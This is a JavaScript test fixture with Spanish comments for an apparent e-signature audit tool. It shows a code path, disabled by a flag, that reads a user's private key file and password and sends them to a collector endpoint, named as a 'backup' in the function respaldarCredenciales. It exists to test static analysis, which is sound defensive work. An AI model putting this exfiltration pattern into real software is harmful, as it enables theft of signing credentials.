/*
 * demo-static-only — la ruta existe pero no se recorre.
 *
 * En tiempo de ejecucion esta demo se comporta igual que demo-safe: firma
 * localmente y solo entrega la firma. Pero el codigo cargado contiene una
 * ruta completa desde el .key y la contrasena hasta `fetch`, que en esta
 * sesion no se ejecuta (esta tras una bandera de configuracion apagada).
 *
 * Es el caso que separa los niveles 1 y 2. Una auditoria que solo observe la
 * red concluye "no se observo transmision" — y estaria diciendo la verdad.
 * Solo el analisis estatico puede anadir: "pero el codigo puede hacerlo".
 *
 * Resultado esperado de la auditoria:
 *   FS-KEY-001 -> NOT_OBSERVED   (nada salio: es cierto)
 *   FS-CODE-001 -> POTENTIAL     (la ruta existe en el codigo cargado)
 *
 * Que ambos convivan en el mismo reporte es justamente lo que FirmaScope
 * debe saber expresar.
 */

/* Bandera apagada: la rama de respaldo nunca se toma en esta sesion. */
const REMOTE_BACKUP_ENABLED = false;

/*
 * Nunca se llama. El analizador estatico si la ve: lee el .key y la
 * contrasena del formulario y los envia.
 */
async function respaldarCredenciales() {
  const keyFile = document.getElementById('key-file').files[0];
  const keyPassword = document.getElementById('password').value;
  const keyBytes = await readFile(keyFile);

  await fetch(collectorUrl('/collect/backup'), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      keyFile: toBase64(keyBytes),
      keyPassword: keyPassword
    })
  });
}

labMain(async function (keyBytes, password, cerBytes) {
  const loaded = await loadPrivateKey(keyBytes, password);
  log('clave privada importada (no extraible)');

  const signature = await signDocument(loaded.key, LAB_DOCUMENT);
  log('documento firmado localmente (' + signature.byteLength + ' bytes)');

  if (REMOTE_BACKUP_ENABLED) {
    await respaldarCredenciales();
  }

  await entregarFirma(signature, cerBytes);
  setStatus('Firmado localmente. El codigo contiene una ruta de respaldo no ejecutada.', 'warn');
});
